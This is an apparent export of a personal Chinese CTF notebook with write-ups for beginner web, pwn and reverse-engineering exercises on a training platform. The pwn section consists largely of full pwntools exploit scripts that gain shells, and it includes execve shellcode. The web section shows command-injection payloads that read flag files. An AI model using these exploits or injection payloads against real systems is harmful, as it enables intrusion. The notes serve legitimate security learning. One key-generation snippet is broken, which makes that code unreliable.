1. k must be non-zero and p must be a prime. \"\"\" if k == 0: raise ZeroDivisionError('division by zero') if k >= 1 assert is_on_curve(result) return result # Keypair generation and ECDHE ################################################ def make_keypair(): \"\"\"Generates a random private-public key pair.\"\"\" private_key = curve.n public_key = scalar_mult(private_key, curve.g) return private_key, public_key private_key, public_key = make_keypair() print(\"private key:\", hex(private_key)) print(\"public key: (0x{:x}, 0x{:x})\".format(*public_key)) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/web-execrise-area.html":{"url":"adworld/web-execrise-area.html","title":"Web Exercise Area","keywords":"","body":"WEB Exercise Area0x00 前言0x01 view_source0x02 get_post0x03 robots0x04 backup0x05 Cookie0x06 disabled_button0x07 simple_js0x08 xff_referer0x09 weak_auth0x0A webshell0x0B command_execution0x0C simple_phpWEB Exercise Area 0x00 前言 把一直想填的WEB WP坑填了一下 发现有些题又不会做了。。。。 收货： hackbar的基本使用方法 burp Intruder的爆破方法 菜刀的使用 Todo: js逻辑的分析 php隐式类型转换的其他“漏洞” 0x01 view_source chrome 浏览器直接加 view-source:头 0x02 get_post 用hackbar或者burp方便的修改get和post值 0x03 robots 访问robots.txt 什么不让爬虫访问我们访问什么。。。。。 0x04 backup 考察一般备份文件的后缀名是 .bak 0x05 Cookie 考Cookie就看Cookie console里 alert(document.cookie) 提示访问cookie.php 提示看http response 在Chrome DevTool Network里查看请求头 得到flag 0x06 disabled_button 把button的disable属性去了 0x07 simple_js Simple吗？我好菜啊。。。。。 F12看到源代码里有如下脚本 function dechiffre(pass_enc){ var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i 5 && i 一开始直接打 console.log(dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")) 发现出来的就是错误提示信息 后来想想也是 参数pass_enc根本没用啊 p+的都是tab[2]的值，而tab[2]里的都是x35的值。。。。 所以改写了一下脚本 function dechiffre(pass_enc){ var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab2 = pass_enc.split(',');//交换tab1 tab2 var tab = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i 5 && i 得到flag:786OsErtk1 但是还是不对。。。。(Todo占坑) 看了大佬的wp发现少了最后一位。。。。。 事实上，通过分析函数逻辑可以将其转换为如下的js代码 function dechiffre() { var pass = \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"; var tab2 = pass.split(','); var i; var p = \"\"; for (i = 0; i flag:786OsErtk12 0x08 xff_referer Hackbar真是个好东西 在Hackbar里加两个Header Referer: https://www.google.com X-Forwarded-For：123.123.123.123 0x09 weak_auth 提示弱密码 用burp_suite 字典爆破 0x0A webshell 直接有webshell也给webshell密码了 菜刀连一下 然后直接下载flag.txt 0x0B command_execution 直接显示命令调用情况了 用管道符 “|”连接两个命令 先找一下flag位置 payload=1.1.1.1 | find / -name flag* 然后再cat payload=1.1.1.1 | cat /home/flag.txt 0x0C simple_php php弱类型比较绕过 字符串和数字比较时会把字符串能转数字的部分转成数字 payload=http://111.198.29.45:47621/?a=[]&b=1235aaaaa © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/pwn-exercise-area.html":{"url":"adworld/pwn-exercise-area.html","title":"PWN Exercise Area","keywords":"","body":"Pwn Exercise Area0x00 前言0x01 GetshellExp0x02 CGfsbpayload0x03 when_did_you_bornPayloadExp0x04 hello_pwnpayloadExp0x05 level0Exp0x06 level2Payload:Exp:0x07 stringPayloadExp0x08 guess_numPayloadExp0x09 int_overflowPayloadExp0x0A cgpwn20x0B level3PayloadExpPwn Exercise Area 0x00 前言 因为pwn基础实在太次所以从头到尾刷了一边攻防世界上的新手练习题 wsl+pwntool+vscode 太舒适了 虽然64位wsl调32位的ELF很麻烦 收货： pwntool的基本使用方式和exp的基础写法 对函数调用时栈内的变化有了更深的了解，懂了一点点栈溢出的含义 对C格式化字符串有了更深的理解 Todo: gdb-peda 本地动态调试查看程序实时栈变化 pwntool 本地调试和log的写法 shellcode的编写 0x01 Getshell 真·运行就能拿到flag shell Exp #coding=utf-8 from pwn import * io=remote(\"111.198.29.45\",\"30397\") io.interactive() 然后cat flag就完事了 0x02 CGfsb 最基础的printf格式化漏洞 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/ checksec 一下发现是32位的ELF 然后也没有开PIE 丢进ida pro,关键部分长这样 printf(&s); if ( pwnme == 8 ) { puts(\"you pwned me, here is your flag:\\n\"); system(\"cat flag\"); } else { puts(\"Thank you!\"); } 也就是说我们要修改pwnme的值为8 有没觉得这个printf很奇怪？ 在不带参数的情况下，我们一般是这样写的 printf(“xxxx”); 由此想要直接输出一个字符串s，写 printf(&s); 也是没有问题的 但是，由于printf接受的第一个参数是可以带%进行格式化控制的。 如果这个时候我们在字符串里写入格式化控制，会printf出来啥呢 比如我们构造这样一个payload: payload=\"a\"*4+'-%p'*10#%p表示用地址的格式打印变量的值 然后扔进写好的exp框架里 #coding=utf-8 from pwn import * payload=\"a\"*4+'-%p'*20 io=remote(\"111.198.29.45\",\"51832\") io.sendlineafter(\"please tell me your name:\",\"eki\") io.sendlineafter(\"leave your message please:\",payload) io.interactive() 返回 hello eki your message is: aaaa-0xffedb8de-0xf77755a0-0xf0b5ff-0xffedb90e-0x1-0xc2-0x6b6548fb-0xa69-(nil)-0x61616161-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d 可以看到aaaa对应的\"地址\"（字符串的值）0x61616161在第十位出现了 所以我们可以把aaaa换成pwnme的地址，然后再利用 %n - 到目前为止所写的字符数 把8写入pwnme的地址(可在ida pro里找到) 就完成了修改pwnme的值的任务 payload pwnme_addr=0x0804A068 payload=p32(pwnme_addr)+\"%04c\"+\"%10$n\" #%04c用于输出4个空字符+p32地址的四位就符合8的要求了 %10$n 是为了将%n作用于第10个参数（除去第一个字符串参数） 0x03 when_did_you_born checksec 一下发现是64位的elf 也没有PIE 逆向得到核心代码 __isoc99_scanf(\"%d\", &v5); if ( v5 == 1926 ) { puts(\"You Cannot Born In 1926!\"); result = 0LL; } else { puts(\"What's Your Name?\"); gets(&v4); printf(\"You Are Born In %d\\n\", v5); if ( v5 == 1926 ) { puts(\"You Shall Have Flag.\"); system(\"cat flag\"); } 也就是说我们在第一步不能让v5=1926 但是要让v5在第二步为1926 怎么办呢。 了解到 gets从标准输入设备读字符串函数，其可以无限读取，不会判断上限，以回车结束读取，所以程序员应该确保buffer的空间足够大，以便在执行读操作时不发生溢出。 所以我们可以通过溢出的方式把本来应该在v4里的数据覆盖到v5上 通过ida我们可以看到 char v4; // [rsp+0h] [rbp-20h] unsigned int v5; // [rsp+8h] [rbp-18h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] 也就是说v4和v5相差8位,可构造 Payload payload=\"a\"*8+p64(1926) Exp #coding=utf-8 from pwn import * payload=\"a\"*8+p64(1926) io=remote(\"111.198.29.45\",\"44355\") io.sendlineafter(\"What's Your Birth?\",\"1234\") io.sendlineafter(\"What's Your Name?\",payload) io.interactive() 0x04 hello_pwn 和上一题类似 也是溢出覆盖 read(0, &unk_601068, 0x10uLL); if ( dword_60106C == 1853186401 ) sub_400686(); ssize_t read (int fd, void *buf, size_t count); read()是一个计算机编程语言函数，会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或无可读取的数据。错误返回-1,并将根据不同的错误原因适当的设置错误码。 在ida pro里看这两个的地址 .bss:0000000000601068 unk_601068 db ? ; ; DATA XREF: main+3B↑o .bss:0000000000601069 db ? ; .bss:000000000060106A db ? ; .bss:000000000060106B db ? ; .bss:000000000060106C dword_60106C dd ? ; DATA XREF: main+4A↑r 差四个字节覆盖到dword_60106c，于是构造 payload payload=\"a\"*4+p64(1853186401) Exp #coding=utf-8 from pwn import * payload=\"a\"*4+p64(1853186401) io=remote(\"111.198.29.45\",\"46962\") io.recvuntil(\"lets get helloworld for bof\") io.send(payload) io.interactive() 0x05 level0 checksec 一下 发现是amd64的程序 没有开RELRO，STACK和PIE 放进IDA pro里发现callsystem后门 又在vulnerable_function()里看到如下内容 ssize_t vulnerable_function() { char buf; // [rsp+0h] [rbp-80h] return read(0, &buf, 0x200uLL); } 0x200ull显然可以造成溢出覆盖，这里我们溢出到rbp(64位系统8字节)后修改调用函数的return值使之跳转到callsystem的函数地址，拿到后门 Exp #coding=utf-8 from pwn import * payload=\"a\"*0x80+\"a\"*8+p64(0x400596) dist=remote(\"111.198.29.45\",\"31258\") dist.recvuntil(\"Hello, World\") dist.send(payload) dist.interactive() 0x06 level2 还是惯例拿checksec 分析 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 拖进IDA pro 看到 ssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] system(\"echo Input:\"); return read(0, &buf, 0x100u); } 和上题一样 存在栈溢出漏洞 但是这回没有现成的后门了 但是我们有system命令地址啊 然后在ida pro string 的窗口里又找到了 Address Length Type String .data:0804A024 00000008 C /bin/sh 通过构造伪栈帧 我们可以执行命令system(\"/bin/sh\") Payload: shell_addr = 0x0804A024 system_addr = 0x08048320 payload= \"a\"*(0x88+0x4)+p32(system_addr)+\"a\"*0x04+p32(shell_addr) 0x88用于覆盖缓冲区，0x04用于覆盖ebp地址的字符，接着覆写返回地址为system_addr(system的栈帧中的ebp地址)，0x04填充system函数的返回地址，p32(shell_addr)自然就是system的参数 Exp: #coding=utf-8 from pwn import * shell_addr = 0x0804A024 system_addr = 0x08048320 payload= \"a\"*(0x88+0x4)+p32(system_addr)+\"a\"*0x04+p32(shell_addr) io=remote(\"111.198.29.45\",\"35613\") io.sendlineafter(\"Input:\\n\",payload) io.interactive() 0x07 string checksec: Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 拖进IDA里，发现有好多函数 tips:可以在IDA pro内替换函数名使程序变得更清晰 分析函数，其中有 if ( *a1 == a1[1] ) { puts(\"Wizard: I will help you! USE YOU SPELL\"); v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL); read(0, v1, 0x100uLL); ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);//v1中的内容被当作一段函数执行 } 也就是说我们可以在v1里塞一段shellcode，就可以getshell了 为了使程序进入该语句块，需要*a1==a1[0] 也即a[0]==a[1] 分析该函数发现a是子函数调用的参数 回到上上一级调用函数，在main()里 a是v3[0]的地址,v3[0]=68,v3[1]=85 所以我们要把v3[0]修改成85 再分析函数 我们发现 v4 = __readfsqword(0x28u); _isoc99_scanf(\"%d\", &v1); if ( v1 == 1 ) { puts(\"A voice heard in your mind\"); puts(\"'Give me an address'\"); _isoc99_scanf(\"%ld\", &v2); puts(\"And, you wish is:\"); _isoc99_scanf(\"%s\", &format); puts(\"Your wish is\"); printf(&format, &format);//溢出点 puts(\"I hear it, I hear it....\"); } 根据之前解题的经验，显然我们可以在printf上做文章了 我们先看看format的偏移量 payload=\"A\"*8+\"-p\"*10 返回 Your wish is AAAAAAAA-0x7f703600d6a3-0x7f703600e780-0x7f7035d3f2c0-0x7f7036235700-0x7f7036235700-0x100000022-0x19ed010-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70I hear it, I hear it.... 偏移量为8位， 但是这回我们没有办法对v3的值直接注入了,因为他不在里函数的栈里，但是我们发现在一开始，程序已经将v4的值（即v3对应的地址告诉我们了）,而函数栈中v2的值又是可控的，所以我们可以通过向v2所代表的地址里注入值的方式实现pwn 又因为在函数中看到v2和format相差一位 （0x19ed010），所以我们构造 Payload payload=\"%085d\"+\"%7$n\" Exp #coding=utf-8 from pwn import * payload=\"%85d\"+\"%7$n\" shellcode=\"\\x31\\xF6\\x56\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x53\\x54\\x5F\\xF7\\xEE\\xB0\\x3B\\x0F\\x05\" io=remote(\"111.198.29.45\",\"52943\") io.recvuntil(\"secret[0] is \") v3_addr=io.recvuntil(\"\\n\") v3_address=eval(\"0x\"+v3_addr[:-1]) io.sendlineafter(\"What should your character's name be:\",\"eki\") io.sendlineafter(\"So, where you will go?east or up?:\",\"east\") io.sendlineafter(\"go into there(1), or leave(0)?:\",\"1\") io.sendlineafter(\"'Give me an address'\",str(v3_address)) #io.sendlineafter(\"And, you wish is:\",'A'*8+'-%p'*10) io.sendlineafter(\"And, you wish is:\",payload) io.recvuntil(\"Wizard: I will help you! USE YOU SPELL\") io.send(shellcode) io.interactive() 可以在shell-storm上找到对应架构和系统的shellcode 也可使用pwntool自带的生成工具asm(shellcraft.sh())生成 需要指定 context(arch='amd64', os='linux') 注意v2本身是个以int存的地址所以不需要用p64进行地址转换 0x08 guess_num Checksec: Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 核心代码如下 gets(&v9); v4 = (const char *)seed[0]; srand(seed[0]); for ( i = 0; i 因为rand()本质是上是根据seed生成的一串伪随机数列 所以我们只要覆盖seed(0)为指定值就不难预言后面的数字了 显然gets是可以溢出的 v8和seed[0]在栈上 char v8; // [rsp+10h] [rbp-30h] unsigned int seed[2]; // [rsp+30h] [rbp-10h] 差0x20，所以构造 Payload payload='a'*0x20+p64(123) Exp #coding=utf-8 from pwn import * from ctypes import * #用来调用glibc，和源程序采用一致的rand函数 context(arch = 'amd64', os = 'linux') payload='a'*0x20+p64(123) io=remote(\"111.198.29.45\",\"55317\") io.sendlineafter(\"Please let me know your name!\",payload) libc=cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\") libc.srand(123) for i in range(10): io.sendlineafter(\"Please input your guess number:\",str(libc.rand()%6+1)) io.interactive() 0x09 int_overflow Checksec Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 拖进ida pro 看到一个很奇怪的函数 what_is_this() int what_is_this() { return system(\"cat flag\"); } 显然是个“后门” 再对函数进行分析 char *__cdecl check_passwd(char *s) { char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 8u ) { puts(\"Invalid Password\"); result = (char *)fflush(stdout); } else { puts(\"Success\"); fflush(stdout); result = strcpy(&dest, s); } return result; } char *strcpy(char* dest, const char *src); strcpy 把从src地址开始且含有NULL结束符的字符串复制到以dest开始的地址空间 src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串。 也就是说strcpy是不会检查目标地址有是否够用的空间，我们可以利用这个弱点进行栈溢出，修改result的值使之在return的时候构造what_is_this()的伪栈帧，返回flag值。 sh_addr=0x0804868B payload='a'*(0x14+0x4)+p32(sh_addr) 但是构造的长度显然不满足字符串长度的限制 但是注意到v3是int_8类型，最大能表示255,根据整数的存储原理，我们可以加一些字符让其溢出回到3到8之间 Payload sh_addr=0x0804868B payload='a'*(0x14+0x4)+p32(sh_addr)+'a'*(256-0x14-0x4-0x4+4)#int_8->256=1 Exp #coding=utf-8 from pwn import * context(arch = \"amd64\" ,os = 'linux') sh_addr=0x0804868B payload='a'*(0x14+0x4)+p32(sh_addr)+'a'*(256-0x14-0x4-0x4+4) io=remote(\"111.198.29.45\",\"45927\") io.sendlineafter(\"Your choice:\",\"1\") io.sendlineafter(\"Please input your username:\",\"eki\") io.sendafter(\"Please input your passwd:\",payload) io.interactive() 0x0A cgpwn2 checksec: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 丢进IDA pro 分析 在hello()里 char *hello() { char *v0; // eax signed int v1; // ebx unsigned int v2; // ecx char *v3; // eax char s; // [esp+12h] [ebp-26h] int v6; // [esp+14h] [ebp-24h] /**/ puts(\"please tell me your name\"); fgets(name, 50, stdin); puts(\"hello,you can leave some message here:\"); return gets(&s);//可构造栈溢出 } 和 level类似，我们可以构造一个system(\"/bin/sh\")的伪栈帧 我们在IDA pro里找到了system的地址，但是这次没有\"/bin/sh\"了，怎么办 注意到name位于bss端（全局变量未初始化） 而且题目可以让我们去修改name 所以构造 Payload payload=\"a\"*(0x26+0x04)+p32(system_addr)+\"a\"*4+p32(name_addr) Exp #coding=utf-8 from pwn import * io=remote(\"111.198.29.45\",\"40904\") sh=\"/bin/sh\" name_addr=0x0804A080 system_addr=0x08048420 payload=\"a\"*(0x26+0x04)+p32(system_addr)+\"a\"*4+p32(name_addr) io.sendlineafter(\"please tell me your name\",sh) io.sendlineafter(\"hello,you can leave some message here:\",payload) io.interactive() 0x0B level3 checksec: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 核心代码和level0一致 但是这一次我们在程序里没有system()的后门了。。。。。 怎么办呢 程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。 手把手教你栈溢出从入门到放弃（下）----- https://zhuanlan.zhihu.com/p/25892385 注意到PIE没有开启，那么在libc中函数的offset就是固定的，所以我们如果找出了libc的base address，然后计算出system函数的offset得到system函数的真实地址，就可以pwn了。 我们先用write泄露write函数的实际地址 然后计算出偏移量 接下来只要计算出system和\"/bin/sh\"的实际地址就可以同level2一样getshell了 Payload payload1 = 'a'*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) payload2 = 'a'*(0x88+0x4) +p32(system_addr) + 'a'*4 + p32(shell_addr) Exp #coding=utf-8 from pwn import * elf = ELF(\"./level3\") libc = ELF(\"./libc_32.so.6\") write_plt = elf.plt[\"write\"] write_got = elf.got[\"write\"] main_addr = elf.sym[\"main\"] write_libc = libc.sym[\"write\"] system_libc = libc.sym[\"system\"] payload1 = 'a'*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) #构造write栈帧泄露write_got地址 并重新回到main函数 io=remote(\"111.198.29.45\",\"42198\") io.sendlineafter(\"Input:\\n\",payload1) write_addr=u32(io.recv(4)) libc_base_addr = write_addr - write_libc #计算偏移量 得到基地址 system_addr = libc_base_addr + system_libc shell_addr = libc_base_addr + next(libc.search(\"/bin/sh\")) payload2 = 'a'*(0x88+0x4) +p32(system_addr) + 'a'*4 + p32(shell_addr) io.sendlineafter(\"Input:\\n\",payload2) io.interactive() © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/reverse-execrise-area.html":{"url":"adworld/reverse-execrise-area.html","title":"Reverse Exercise Area","keywords":"","body":"Reverse Execrise Area0x00 前言0x01 re10x02 game静态分析实时修改内存IDA Pro Patch Program0x03 Hello,CTF0x04 open-source0x05 simple-unpack0x06 logmein0x07 insanity0x08 no-strings-attached0x09 csaw2013reversing20x0A getit0x0B Python_trade0x0C mazeReverse Execrise Area 0x00 前言 逆向鲨我，用各种奇怪的技巧存储方式存数据，写函数， 感觉自己学的可能是假的C语言。。。。。。 收货： strings 的用法 IDA pro Patch Program通过修改汇编代码改变程序逻辑 sprintf的用法 64位int分割32位数据的写法 gdb调试的基本操作 upx 简单脱壳 Todo: Ollydbg 调试方法 其他C的奇怪写法 ESP定律 脱壳方法 0x01 re1 入门逆向题，可以放进ida pro里在strings view里找flag 也可以用strings工具找 strings re1.exe |grep {*} 0x02 game 一个翻转的小游戏 拖进IDA 发现只要满足条件（7个灯全亮）程序就会输出flag（加密过） 思路 静态分析 找到程序中输出flag的程序段，自己写脚本输出一遍 #include int main(){ char v[200]; v[59] = 18; v[60] = 64; v[61] = 98; v[62] = 5; v[63] = 2; v[64] = 4; v[65] = 6; v[66] = 3; v[67] = 6; v[68] = 48; v[69] = 49; v[70] = 65; v[71] = 32; v[72] = 12; v[73] = 48; v[74] = 65; v[75] = 31; v[76] = 78; v[77] = 62; v[78] = 32; v[79] = 49; v[80] = 32; v[81] = 1; v[82] = 57; v[83] = 96; v[84] = 3; v[85] = 21; v[86] = 9; v[87] = 4; v[88] = 62; v[89] = 3; v[90] = 5; v[91] = 4; v[92] = 1; v[93] = 2; v[94] = 3; v[95] = 44; v[96] = 65; v[97] = 78; v[98] = 32; v[99] = 16; v[100] = 97; v[101] = 54; v[102] = 16; v[103] = 44; v[104] = 52; v[105] = 32; v[106] = 64; v[107] = 89; v[108] = 45; v[109] = 32; v[110] = 65; v[111] = 15; v[112] = 34; v[113] = 18; v[114] = 16; v[115] = 0; v[2] = 123; v[3] = 32; v[4] = 18; v[5] = 98; v[6] = 119; v[7] = 108; v[8] = 65; v[9] = 41; v[10] = 124; v[11] = 80; v[12] = 125; v[13] = 38; v[14] = 124; v[15] = 111; v[16] = 74; v[17] = 49; v[18] = 83; v[19] = 108; v[20] = 94; v[21] = 108; v[22] = 84; v[23] = 6; v[24] = 96; v[25] = 83; v[26] = 44; v[27] = 121; v[28] = 104; v[29] = 110; v[30] = 32; v[31] = 95; v[32] = 117; v[33] = 101; v[34] = 99; v[35] = 123; v[36] = 127; v[37] = 119; v[38] = 96; v[39] = 48; v[40] = 107; v[41] = 71; v[42] = 92; v[43] = 29; v[44] = 81; v[45] = 107; v[46] = 90; v[47] = 85; v[48] = 64; v[49] = 12; v[50] = 43; v[51] = 76; v[52] = 86; v[53] = 13; v[54] = 114; v[55] = 1; v[56] = 117; v[57] = 126; v[58] = 0; for ( int i = 0; i 实时修改内存 利用CheatEngine修改内存中存储灯亮的值，使之满足条件然后输出flag IDA Pro Patch Program 把标号3-7的汇编条件jnz 修改为jz 相当于变成 if ( byte_532E28[0] == 1 && byte_532E28[1] == 1 && byte_532E28[2] == 1 && byte_532E28[3] != 1 && byte_532E28[4] != 1 && byte_532E28[5] != 1 && byte_532E28[6] != 1 && byte_532E28[7] != 1 ) { sub_457AB4(); } 然后解法就很好得到了 0x03 Hello,CTF 运行程序发现要让我们输入序列号，但是我们没有啊 拖进IDA 可以看到序列号正确与否是这样判断的 strcpy(&v13, \"437261636b4d654a757374466f7246756e\"); while ( 1 ) { memset(&v10, 0, 0x20u); v11 = 0; v12 = 0; sub_40134B(aPleaseInputYou, v6); scanf(aS, v9); if ( strlen(v9) > 0x11 ) break; v3 = 0; do { v4 = v9[v3]; if ( !v4 ) break; sprintf(&v8, asc_408044, v4); strcat(&v10, &v8); ++v3; } while ( v3 根据sprintf的用法 int sprintf(char str, const char format, ...) 发送格式化输出到 str 所指向的字符串 所以可以逆推序列号的hex是这玩意 43 72 61 63 6b 4d 65 4a 75 73 74 46 6f 72 46 75 6e 转成ASCII就完事了 0x04 open-source 根据源码内容直接整就完了 #include #include int main(int argc, char *argv[]) { int first = 0xcafe; int second=25; unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(\"h4cky0u\") - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0; } 0x05 simple-unpack 题目暗明示了 使用 upx -d 把程序脱壳然后同0x01处理 0x06 logmein 真算法逆向 拖进IDA pro分析 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { size_t v3; // rsi int i; // [rsp+3Ch] [rbp-54h] char s[36]; // [rsp+40h] [rbp-50h] int v6; // [rsp+64h] [rbp-2Ch] __int64 v7; // [rsp+68h] [rbp-28h] char v8[8]; // [rsp+70h] [rbp-20h] int v9; // [rsp+8Ch] [rbp-4h] v9 = 0; strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); v7 = 0x65626D61726168LL; v6 = 7; printf(\"Enter your guess: \"); __isoc99_scanf(\"%32s\", s); v3 = strlen(s); if ( v3 = strlen(v8) ) fail(); if ( s[i] != (char)(*((_BYTE *)&v7 + i % v6) ^ v8[i]) ) fail(); } sub_4007F0(); } 这次仍然是对程序中存储的密文进行解密所以理论上也可gdp调试在程序运行的时候拿到flag 但是因为他是一个个算的。 所以这里我们用还是自己写一个类似的解密脚本 其中 *((_BYTE *)&v7 + i % v6 相当于把v7作为一个字符串数组 又因为是小段存储方式，所以解码的时候位置得倒过来（因为这个一开始怎么都解不出来） #include #include int main(){ size_t v3; // rsi int i; // [rsp+3Ch] [rbp-54h] char s[36]; // [rsp+40h] [rbp-50h] int v6; // [rsp+64h] [rbp-2Ch] //__int64 v7; // [rsp+68h] [rbp-28h] char v8[16]; // [rsp+70h] [rbp-20h] int v9; // [rsp+8Ch] [rbp-4h] v9 = 0; strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); char v7[7] = {0x68,0x61,0x72,0x61,0x6D,0x62,0x65}; //strrev(v7); v6 = 7; //__isoc99_scanf(\"%32s\", s); //v3 = strlen(s); for ( i = 0; i 后来看了大佬的WP 发现也可以这样写 #include #include int main(){ size_t v3; // rsi int i; // [rsp+3Ch] [rbp-54h] char s[36]; // [rsp+40h] [rbp-50h] int v6; // [rsp+64h] [rbp-2Ch] //__int64 v7; // [rsp+68h] [rbp-28h] char v8[16]; // [rsp+70h] [rbp-20h] int v9; // [rsp+8Ch] [rbp-4h] v9 = 0; strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); //char v7[7] = {0x68,0x61,0x72,0x61,0x6D,0x62,0x65}; long long v7=0x65626D61726168; char *p=(char *)&v7;//转成字符数组 v6 = 7; //__isoc99_scanf(\"%32s\", s); //v3 = strlen(s); for ( i = 0; i 0x07 insanity 题目说这是一道简单题，果然是一道简单题 又是一道string能看到的明文题 0x08 no-strings-attached 拖进IDA 分析一波发现又是个解密题 本来想和前几题一样静态分析写个解密脚本的 但是在IDA里 数据长这样 .rodata:08048AA8 s dd 143Ah ; DATA XREF: authenticate+11↑o .rodata:08048AAC db 36h ; 6 .rodata:08048AAD db 14h .rodata:08048AAE db 0 .rodata:08048AAF db 0 .rodata:08048AB0 db 37h ; 7 .rodata:08048AB1 db 14h .rodata:08048AB2 db 0 .rodata:08048AB3 db 0 .rodata:08048AB4 db 3Bh ; ; .rodata:08048AB5 db 14h .rodata:08048AB6 db 0 .rodata:08048AB7 db 0 .rodata:08048AB8 db 80h .rodata:08048AB9 db 14h .rodata:08048ABA db 0 .rodata:08048ABB db 0 .rodata:08048ABC db 7Ah ; z .rodata:08048ABD db 14h .rodata:08048ABE db 0 .rodata:08048ABF db 0 .rodata:08048AC0 db 71h ; q .rodata:08048AC1 db 14h .rodata:08048AC2 db 0 .rodata:08048AC3 db 0 .rodata:08048AC4 db 78h ; x .rodata:08048AC5 db 14h .rodata:08048AC6 db 0 .rodata:08048AC7 db 0 .rodata:08048AC8 db 63h ; c .rodata:08048AC9 db 14h .rodata:08048ACA db 0 .rodata:08048ACB db 0 .rodata:08048ACC db 66h ; f .rodata:08048ACD db 14h .rodata:08048ACE db 0 .rodata:08048ACF db 0 .rodata:08048AD0 db 73h ; s .rodata:08048AD1 db 14h .rodata:08048AD2 db 0 .rodata:08048AD3 db 0 .rodata:08048AD4 db 67h ; g .rodata:08048AD5 db 14h .rodata:08048AD6 db 0 .rodata:08048AD7 db 0 .rodata:08048AD8 db 62h ; b .rodata:08048AD9 db 14h .rodata:08048ADA db 0 .rodata:08048ADB db 0 .rodata:08048ADC db 65h ; e .rodata:08048ADD db 14h .rodata:08048ADE db 0 .rodata:08048ADF db 0 .rodata:08048AE0 db 73h ; s .rodata:08048AE1 db 14h .rodata:08048AE2 db 0 .rodata:08048AE3 db 0 .rodata:08048AE4 db 60h ; ` .rodata:08048AE5 db 14h .rodata:08048AE6 db 0 .rodata:08048AE7 db 0 .rodata:08048AE8 db 6Bh ; k .rodata:08048AE9 db 14h .rodata:08048AEA db 0 .rodata:08048AEB db 0 .rodata:08048AEC db 71h ; q .rodata:08048AED db 14h .rodata:08048AEE db 0 .rodata:08048AEF db 0 .rodata:08048AF0 db 78h ; x .rodata:08048AF1 db 14h .rodata:08048AF2 db 0 .rodata:08048AF3 db 0 .rodata:08048AF4 db 6Ah ; j .rodata:08048AF5 db 14h .rodata:08048AF6 db 0 .rodata:08048AF7 db 0 .rodata:08048AF8 db 73h ; s .rodata:08048AF9 db 14h .rodata:08048AFA db 0 .rodata:08048AFB db 0 .rodata:08048AFC db 70h ; p .rodata:08048AFD db 14h .rodata:08048AFE db 0 .rodata:08048AFF db 0 .rodata:08048B00 db 64h ; d .rodata:08048B01 db 14h .rodata:08048B02 db 0 .rodata:08048B03 db 0 .rodata:08048B04 db 78h ; x .rodata:08048B05 db 14h .rodata:08048B06 db 0 .rodata:08048B07 db 0 .rodata:08048B08 db 6Eh ; n .rodata:08048B09 db 14h .rodata:08048B0A db 0 .rodata:08048B0B db 0 